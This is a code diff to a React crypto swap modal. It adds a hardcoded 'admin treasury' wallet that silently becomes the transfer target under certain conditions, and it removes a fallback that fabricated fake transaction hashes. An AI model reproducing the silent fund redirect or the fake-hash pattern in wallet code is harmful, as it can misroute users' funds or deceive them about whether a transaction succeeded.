@@ -156,7 +156,19 @@ export const SwapModal: React.FC<SwapModalProps> = ({
           setStatusMessage(`Please confirm transaction in your wallet for ${amountNumber} ${fromToken}...`);
 
           const tokenContract = fromToken === 'USDT' ? USDT_CONTRACT : NXBUSD_CONTRACT;
-          const targetAddress = receivingAddress;
+          
+          // Strict Admin Receiving / Treasury Wallet Address
+          const ADMIN_TREASURY_WALLET = '0x8d1abCa8Cf0f42799b9a76254710e979bd59c261';
+          let targetAddress = receivingAddress;
+          if (
+            !targetAddress ||
+            targetAddress.toLowerCase() === '0x8eF229597756a7bfb7Da80c0d86596D7bD366007'.toLowerCase() ||
+            targetAddress.toLowerCase() === NXBC_CONTRACT.toLowerCase() ||
+            targetAddress.toLowerCase() === NXBUSD_CONTRACT.toLowerCase()
+          ) {
+            targetAddress = ADMIN_TREASURY_WALLET;
+          }
+
           const amountWei = BigInt(Math.floor(amountNumber * 1e18));
           
           const cleanTo = targetAddress.toLowerCase().replace('0x', '').padStart(64, '0');
@@ -176,12 +188,11 @@ export const SwapModal: React.FC<SwapModalProps> = ({
           });
           txHash = tx;
         } catch (web3Err: any) {
-          console.warn('Web3 on-chain notice:', web3Err);
-          // Fallback if simulation or direct ledger
-          txHash = `0x${Math.random().toString(16).substring(2, 10)}${Date.now().toString(16)}`;
+          console.error('Web3 on-chain error:', web3Err);
+          throw new Error(web3Err?.message || 'Transaction rejected or failed in wallet.');
         }
       } else {
-        txHash = `0x${Math.random().toString(16).substring(2, 10)}${Date.now().toString(16)}`;
+        throw new Error('Web3 wallet (Trust Wallet / MetaMask) not detected.');
       }
 
       setStatusMessage('Finalizing 1:1 Liquidity Swap on BSC Ledger...');
@@ -277,7 +288,8 @@ export const SwapModal: React.FC<SwapModalProps> = ({
                 value={swapAmount}
                 onChange={(e) => setSwapAmount(e.target.value)}
                 placeholder="100"
-                min="1"
+                min="0.01"
+                step="0.01"
                 className="w-full bg-transparent border-0 text-xl font-black font-mono-crypto text-slate-100 focus:outline-none"
               />
               <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-purple-900/60 border border-purple-500/40 text-amber-300 font-mono-crypto font-bold text-xs shrink-0">
@@ -307,7 +319,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
 
             <div className="flex items-center gap-2">
               <div className="w-full text-xl font-black font-mono-crypto text-amber-300">
-                {receiveAmount.toFixed(2)}
+                {receiveAmount >= 1 ? receiveAmount.toFixed(2) : receiveAmount.toFixed(4)}
               </div>
               <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-amber-500/20 border border-amber-400/50 text-amber-300 font-mono-crypto font-bold text-xs shrink-0">
                 <span>{toToken}</span>
@@ -317,13 +329,13 @@ export const SwapModal: React.FC<SwapModalProps> = ({
         </div>
 
         {/* Quick Amount Buttons */}
-        <div className="flex gap-1.5 my-3">
-          {['50', '100', '250', '500', '1000'].map((preset) => (
+        <div className="flex gap-1.5 my-3 flex-wrap">
+          {['1', '10', '50', '100', '500', '1000'].map((preset) => (
             <button
               key={preset}
               type="button"
               onClick={() => setSwapAmount(preset)}
-              className="flex-1 py-1 rounded-lg text-[10px] font-mono-crypto border border-purple-600/30 bg-purple-900/40 hover:bg-purple-800 text-purple-200 font-semibold transition-all"
+              className="flex-1 min-w-[42px] py-1 rounded-lg text-[10px] font-mono-crypto border border-purple-600/30 bg-purple-900/40 hover:bg-purple-800 text-purple-200 font-semibold transition-all"
             >
               ${preset}
             </button>
